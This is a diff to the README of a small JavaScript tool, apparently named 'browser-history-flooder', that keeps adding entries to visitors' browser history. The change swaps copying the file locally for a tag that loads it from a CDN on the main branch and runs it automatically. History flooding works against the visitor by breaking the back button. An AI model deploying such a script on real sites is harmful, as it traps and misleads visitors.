@@ -13,11 +13,10 @@ A lightweight JavaScript script that periodically adds entries to the browser's 
 
 ## Installation
 
-1. Copy `history.min.js` into your project.
-2. Include it in your HTML:
+Include it in your HTML:
 
 ```html
-<script src="history.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/ebdimsks/browser-history-flooder@main/history.min.js" async></script>
 ```
 
 The script starts automatically when loaded.
